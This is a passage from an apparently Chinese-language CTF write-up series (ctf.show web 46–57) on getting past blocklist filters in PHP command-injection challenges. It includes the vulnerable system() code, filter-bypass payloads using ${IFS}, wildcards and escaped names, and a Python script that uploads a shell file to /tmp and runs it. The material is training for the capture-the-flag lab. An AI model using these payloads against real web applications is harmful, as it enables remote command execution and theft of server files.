class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-15"><a href="#一-分析代码：-15" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12211936.png"></p><p>对以上进行了过滤</p><h2 id="二-解题思路：-14"><a href="#二-解题思路：-14" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>将空格过滤与通配符过滤结合一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=more%09????.???||</span><br></pre></td></tr></table></figure><h1 id="web-47"><a href="#web-47" class="headerlink" title="web 47"></a>web 47</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-16"><a href="#一-分析代码：-16" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12212418.png"></p><p>对以上进行了过滤。</p><p>增加了一些过滤</p><h2 id="二-解题思路：-15"><a href="#二-解题思路：-15" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=strings%09????.???||</span><br></pre></td></tr></table></figure><h1 id="web-48"><a href="#web-48" class="headerlink" title="web 48"></a>web 48</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-17"><a href="#一-分析代码：-17" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12212922.png"></p><p>过滤以上所示</p><h2 id="二-解题思路：-16"><a href="#二-解题思路：-16" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=strings%09????.???||</span><br></pre></td></tr></table></figure><h1 id="web-49"><a href="#web-49" class="headerlink" title="web 49"></a>web 49</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-18"><a href="#一-分析代码：-18" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12213420.png"></p><p>对以上进行了过滤</p><h2 id="二-解题思路：-17"><a href="#二-解题思路：-17" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac%09????.???||</span><br></pre></td></tr></table></figure><h1 id="web-50"><a href="#web-50" class="headerlink" title="web 50"></a>web 50</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-19"><a href="#一-分析代码：-19" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12213717.png"></p><p>对以上进行了过滤</p><p>%09被过滤</p><p>&lt;&gt;和?同时使用不回显 所以用\代替？</p><h2 id="二-解题思路：-18"><a href="#二-解题思路：-18" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure><h1 id="web-51"><a href="#web-51" class="headerlink" title="web 51"></a>web 51</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-20"><a href="#一-分析代码：-20" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-31164725.png"></p><p>对以上进行了过滤</p><h2 id="二-解题思路：-19"><a href="#二-解题思路：-19" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fla\g.php||</span><br></pre></td></tr></table></figure><h1 id="web-52"><a href="#web-52" class="headerlink" title="web 52"></a>web 52</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-21"><a href="#一-分析代码：-21" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-01154408.png"></p><p>对以上进行了过滤</p><h2 id="二-解题思路：-20"><a href="#二-解题思路：-20" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>对我们的<code>&lt;&gt;</code>进行了过滤，我们可以使用<code>$&#123;IFS&#125;</code>来代替空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla\g.php||</span><br></pre></td></tr></table></figure><h1 id="web-53"><a href="#web-53" class="headerlink" title="web 53"></a>web 53</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-22"><a href="#一-分析代码：-22" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-01155410.png"></p><p>过滤了以上内容。</p><h2 id="二-解题思路：-21"><a href="#二-解题思路：-21" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p><code>$IFS</code>符号如果是在当前目录读文件则中间要用’’来分隔一下<br> 如果读其他路径下的如根目录 / 下的文件 则不用使用符分割<br> <code>$IFS</code>后边可以使用符号 但是不能直接跟字符 会显示无效命令<br> 可构造playload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;????.???</span><br></pre></td></tr></table></figure><h1 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码-2"><a href="#一-分析代码-2" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>增加了许多过滤，nl给过滤了</p><h2 id="二-解题思路：-22"><a href="#二-解题思路：-22" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><h3 id="方法一：-8"><a href="#方法一：-8" class="headerlink" title="方法一："></a>方法一：</h3><p>使用vi读，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=vi$&#123;IFS&#125;????.???</span><br></pre></td></tr></table></figure><h3 id="方法二：-8"><a href="#方法二：-8" class="headerlink" title="方法二："></a>方法二：</h3><p><code>grep test *file</code> #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p><p>可构造playload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=uniq$&#123;IFS&#125;????.???</span><br><span class="line">?c=grep$&#123;IFS&#125;&#x27;&#123;&#x27;$&#123;IFS&#125;fl???php</span><br><span class="line">（在 fl???php匹配到的文件中，查找含有&#123;的文件，并打印出包含 &#123; 的这一行）</span><br></pre></td></tr></table></figure><h1 id="web-55"><a href="#web-55" class="headerlink" title="web 55"></a>web 55</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="一-分析代码-3"><a href="#一-分析代码-3" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-0162713.png"></p><p>可以看出过滤的非常多</p><h2 id="二-解题思路：-23"><a href="#二-解题思路：-23" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><h3 id="方法一：-9"><a href="#方法一：-9" class="headerlink" title="方法一："></a>方法一：</h3><p>首先是/bin这个目录。<br>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</p><p>这题利用/bin/base64<br>base64这个命令就是将指定的文件的内容以base64加密的形式输出。<br>因为过滤了字母，正好可以用64来匹配，最终payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/????<span class="number">64</span> ????????</span><br></pre></td></tr></table></figure><p>匹配的是<code>/bin/base64 flag.php</code></p><h3 id="方法二：-9"><a href="#方法二：-9" class="headerlink" title="方法二："></a>方法二：</h3><p>bzip2是linux下面的压缩文件的命令 <a href="https://www.runoob.com/linux/linux-comm-bzip2.html">关于bzip2命令的具体介绍</a><br> /usr/bin目录:</p><p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等。</p><p>我们可以利用/usr/bin下的bzip2</p><p>意思就是说我们先将flag.php文件进行压缩，然后再将其下载<br>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/???/????2 ????.???</span><br><span class="line">也就是/usr/bin/bzip2 flag.php</span><br></pre></td></tr></table></figure><h1 id="web-56"><a href="#web-56" class="headerlink" title="web 56"></a>web 56</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码-4"><a href="#一-分析代码-4" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-01164034.png"></p><p>过滤的范围更广了</p><h2 id="二-解题思路：-24"><a href="#二-解题思路：-24" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>利用了P神的无数字字母getshell：<br> <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p><p>将命令写入文件后，可以利用点. 来执行文件中的命令，例如<code>. file</code>。也可以<code>source file</code>，但是这题过滤了字母，因此只能用点。</p><p>如何正确匹配到我们上传的文件呢？探索过程见p神的文章，最后的利用是<code>/???/????????[@-[]</code>  ， <code>[@-[]</code>是通配符，用来表示大写字母。</p><p>写一个文件上传的前端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>上传一个txt文件，文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>注：shell程序必须以”#!/bin/sh”开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径</p><p>上传抓包</p><p>抓包之后添加参数c如下，多发包几次（因为并不一定生成的临时文件的最后一个字母就是大写字母），可以看到执行了ls命令</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-01233816.png"></p><p>之后用cat指令读就可以</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-01234018.png"></p><p>或者运行以下脚本即可得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;feng.txt&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-57"><a href="#web-57" class="headerlink" title="web 57"></a>web 57</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="一-分析代码-5"><a href="#一-分析代码-5" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-02154648.png"></p><p>过滤了以上的内容，同时提示我们flag in 36.php</p><h2 